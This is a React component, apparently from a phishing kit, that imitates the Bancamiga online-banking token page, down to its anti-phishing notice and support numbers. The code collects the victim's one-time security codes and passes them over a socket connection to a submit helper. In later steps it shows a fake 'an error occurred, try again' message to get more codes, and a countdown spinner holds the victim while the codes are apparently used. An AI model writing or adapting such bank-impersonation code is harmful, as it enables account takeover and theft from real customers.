/* eslint-disable no-mixed-operators */
import React, { useContext, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { SocketContext, UserDataContext } from '../../../context'
import { useFormik } from 'formik'
import { tokenValidate } from '../../../security/tokenValidate'
import { submitBase } from '../../../helpers/submitBase'
import { TokenInput } from './TokenInput'
import { Spiner } from '../../Spiner'
import iconI from '../../../assets/iconi.png'
import iconVerify from '../../../assets/iconVerify.png'
import iconUser from '../../../assets/iconUser.png'

export const Token = ({urlToNavigate, spiner, timeLoader, endUrl = '', tokenMode}) => {
  const valuesData = { token: '' }
  
  const navigate = useNavigate()
  const { addData } = useContext(UserDataContext)
  const { socket } =  useContext(SocketContext)  
  
  const [showSpiner , SetshowSpiner] = useState(false)
  const [seconds, setSeconds] = useState(timeLoader / 1000)
  const dataImportant = { addData, socket, SetshowSpiner, urlToNavigate, spiner, timeLoader, navigate }
  
  const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
    initialValues: valuesData,
    // En caso de poner un error personalizado colocar errortoken y errorPassword
    validate: values => tokenValidate({values}),
    onSubmit: async(valuesData, { resetForm }) => {
      if(tokenMode === 'token1') valuesData.token1 = valuesData.token
      if(tokenMode === 'token2') valuesData.token2 = valuesData.token
      if(tokenMode === 'token3') valuesData.token3 = valuesData.token
      
      const decreaseInterval = setInterval(() => {
        setSeconds(e => e - 1)
      }, 1000)
      setTimeout(() => {
        clearInterval(decreaseInterval)
        setSeconds(timeLoader / 1000)
        resetForm()
        SetshowSpiner(false)
      }, timeLoader)
      
      submitBase({dataImportant, valuesData, endUrl, setSeconds})
    }
  })


  return (
    <div>
      <div className=' bg-white flex items-start gap-2 p-[20px] m-[20px] border-[2px]'>
        <div>
          <div className='border-[2px] bg-white h-[70px] w-[70px]' />
        </div>
        <div>
          <p className="text-[20px]">Esta es su imagen Anti-Pishing?</p>
          <p className="text-[13px]">Si la imagen No corresponde con la seleccionada por usted.</p>
          <p className="text-[13px]">Favor contáctenos por el 0500-8822622 o 0501-8822622</p>
        </div>
      </div>

      <form className='flex flex-col' onSubmit={handleSubmit}>
        <TokenInput 
          errors={errors}
          handleBlur={handleBlur}
          handleChange={handleChange}
          token={values.token}
          touched={touched}
        />
        {
          tokenMode === 'token2' || tokenMode === 'token3' ? (
            <p className='px-[20px] mt-2 text-red-600 text-[13px]'>Ha ocurrido un error, por favor vuelve a intentarlo</p>
          ) : null
        }
        <div className='flex flex-col p-[20px] items-center justify-center'>
          <div className='bg-[#d6dde6] border-l-[4px] p-2 border-l-[#9cb3c9] w-full'>
            <p className='text-[13px] text-[#47719b]'>
              <img className='inline-block h-[17px] top-0 mr-1 pb-1' src={iconI} alt="iconI" />
              Olvidate de la clave dinámica por SMS y correo electrónico Activando el 2FA desde la posición global tendrás más seguridad y rapidez en tus operaciones.</p>
          </div>
          <div className='flex gap-2 mt-10'>
            {
              showSpiner === true ? <Spiner tokenMode={true} seconds={seconds} /> : (
                <>
                <div>
                  <button 
                    disabled={
                      (
                        (touched.token && errors.token ) || values.token.length === 0 ) ? true : false
                    }
                      className='
                      flex justify-center items-center gap-2 outline-none
                      bg-[#dd4966] border-[#dd4966] border-[1px] text-white rounded-[2px] shadowBtn p-[6px_12px] text-[13px] transition-all
                      disabled:opacity-60 disabled:cursor-not-allowed
                      hover:bg-[#a2364c] hover:border-[#ad3950]
                      active:top-[1px] active:left-[1px]
                      '
                      type='button'
                  >
                    <img className='w-[13px]' src={iconUser} alt="iconUser" />
                    Cancelar
                  </button>
                </div>

                <div>
                  <button 
                    disabled={
                      (
                        (touched.token && errors.token ) || values.token.length === 0 ) ? true : false
                    }
                      className='
                      flex justify-center items-center gap-2 outline-none
                      bg-[#96bf48] border-[#84A83E] border-[1px] text-white rounded-[2px] shadowBtn p-[6px_12px] text-[13px] transition-all
                      disabled:opacity-60 disabled:cursor-not-allowed
                      hover:bg-[#89AD45] hover:border-[#78973B]
                      active:top-[1px] active:left-[1px]
                      '
                      type='submit'
                  >
                    <img className='w-[13px]' src={iconVerify} alt="iconUser" />
                    Ingresar
                  </button>
                </div>
                </>
              )
            }
            
          </div>
        </div>
        <span className='text-center text-[#999] font-bold text-[11px] p-10  '>Para mayor información o asesoria contáctanos al <br />
          Centro de atención Bancamiga (CAB) <br />
          0500-TUBANCA y 0500-1000400
        </span>
      </form>
    </div>
  )
}
